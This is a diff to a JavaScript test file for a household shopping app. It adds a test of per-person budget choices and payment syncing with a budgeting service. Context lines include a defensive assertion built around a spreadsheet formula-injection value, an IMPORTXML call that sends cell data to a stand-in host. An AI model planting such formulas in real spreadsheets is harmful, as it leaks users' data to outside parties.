@@ -153,6 +153,29 @@ const home = (hid, name, extra) => ({ ['households/' + hid]: { name, members: ['
     const fam = (written || []).find(x => x[1] === 'p1') || [], num = (written || []).find(x => x[1] === 'p2') || [];
     ok(fam[2] === '\'=IMPORTXML("https://x.example/?"&A1)' && num[2] === '-4.5', 'backup sheet: a kept row that looks like a formula is written back as text (' + fam[2] + ')');
   }
+  // ---- 6. Budgie: each of you keeps your own choice of food budget, and your partner's shared food payments come through ----
+  if (!only || only === 6) {
+    const B = { people: [{ id: 'ethan', name: 'Ethan' }, { id: 'sophie', name: 'Sophie' }], budgets: [{ id: 'bud-e1', person: 'ethan', name: 'Food' }, { id: 'bud-e2', person: 'ethan', name: 'Groceries' }],
+      transactions: [{ id: 't-sophie1', date: TODAY, person: 'sophie', amount: 23.5, budget: 'bud-s9', split: 'half', note: 'Aldi' }], splits: [], accounts: [] };
+    const posts = [];
+    const fetch = async (url, opt) => { if (!/script\.google\.com/.test(url)) return { ok: true, json: async () => JSON.parse(lib) }; const b = JSON.parse(opt.body); posts.push(b); return { ok: true, json: async () => ({ ok: true, person: 'ethan', keyType: 'app', now: Date.now(), full: true, rows: B }) }; };
+    // Sophie picked her food budget on her phone (saved before choices were kept per person)
+    const pre = { 'users/u_ethan': { households: ['h1'], current: 'h1', names: { h1: 'Home' } }, ...home('h1', 'Home', { 'households/h1/people/p_s': { name: 'Sophie', order: 2 },
+      'households/h1/config/settings': { budgieBudget: 'bud-s1', budgieBudgets: { sophie: 'bud-s1' } }, ['households/h1/weeks/' + MON]: planned() }) };
+    const A = boot({ pre, fetch, local: { 'peckish.budgie': JSON.stringify({ u: 'https://script.google.com/macros/s/B/exec', k: 'app_peckish_' + 'c'.repeat(64), hid: 'h1' }) } });
+    await wait(5000);
+    const imp = A.docAt('households/h1/shops/b_t_sophie1') || {};
+    ok(imp.amount === 23.5 && imp.paidBy === 'p_s' && imp.source === 'budgie', 'budgie: Sophie\u2019s shared food payment shows up on Ethan\u2019s phone (' + JSON.stringify(imp).slice(0, 80) + ')');
+    await A.act('tab', 'settings'); await A.act('set-page', 'linked', null, 400);
+    const sel = A.d.querySelector('[data-change="bg-budget"]'); sel.value = 'bud-e2'; sel.dispatchEvent(new A.w.Event('change', { bubbles: true })); await wait(400);
+    const st = A.docAt('households/h1/config/settings') || {};
+    ok(st.budgieBudgets && st.budgieBudgets.ethan === 'bud-e2' && st.budgieBudgets.sophie === 'bud-s1', 'budgie: choosing your food budget keeps the other person\u2019s choice (' + JSON.stringify(st.budgieBudgets) + ')');
+    await A.act('tab', 'shop', null, 400); await A.act('shop-view', 'cost', null, 400);
+    A.d.querySelector('#ls-amt').value = '41.20'; await A.submit('[data-form="logshop"]', 2500);
+    const sent = posts.flatMap(b => b.ops || []).find(o => o.row && o.row.amount === 41.2);
+    ok(sent && sent.row.budget === 'bud-e2', 'budgie: and your shops go to the budget you chose (' + (sent && sent.row.budget) + ')');
+    ok(!A.errs.length, 'budgie: no page errors ' + A.errs.join(' | '));
+  }
   console.log(fails ? fails + ' FAILED' : 'all passed');
   process.exit(fails ? 1 : 0);
 })();
